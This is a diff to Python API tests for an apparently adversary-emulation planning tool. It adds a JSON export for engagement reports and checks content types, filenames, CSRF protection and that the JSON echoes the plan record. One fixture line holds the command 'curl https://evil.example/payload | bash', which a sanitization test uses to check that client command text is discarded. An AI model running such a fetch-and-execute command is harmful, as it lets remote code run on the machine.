@@ -163,15 +163,16 @@ class ApiContractTests(unittest.TestCase):
         self.assertIn("macOS", response.headers.get("Content-Disposition", ""))
 
     def test_engagement_reports_require_same_origin_token(self):
-        for report_format in ("html", "pdf"):
+        for report_format in ("html", "pdf", "json"):
             with self.subTest(report_format=report_format):
                 response = self.client.post(f"/api/report/{report_format}", json=plan_fixture("linux"))
                 self.assertEqual(response.status_code, 403)
 
-    def test_engagement_report_exports_html_and_pdf(self):
+    def test_engagement_report_exports_html_pdf_and_canonical_json(self):
         expected = {
             "html": "text/html",
             "pdf": "application/pdf",
+            "json": "application/json",
         }
         for report_format, mimetype in expected.items():
             with self.subTest(report_format=report_format):
@@ -182,8 +183,21 @@ class ApiContractTests(unittest.TestCase):
                 )
                 self.assertEqual(response.status_code, 200)
                 self.assertEqual(response.mimetype, mimetype)
-                self.assertIn(f"_report.{report_format}", response.headers["Content-Disposition"])
+                suffix = f"_report.{report_format}" if report_format != "json" else ".json"
+                self.assertIn(suffix, response.headers["Content-Disposition"])
                 self.assertEqual(response.headers["Cache-Control"], "no-store")
+
+    def test_engagement_report_json_is_the_existing_plan_record(self):
+        document = plan_fixture("linux")
+        response = self.client.post(
+            "/api/report/json",
+            json=document,
+            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
+        )
+
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(response.get_json(), document)
+        self.assertNotIn("_report.json", response.headers["Content-Disposition"])
 
     def test_engagement_report_discards_client_command_text(self):
         document = plan_fixture("linux", command="curl https://evil.example/payload | bash")
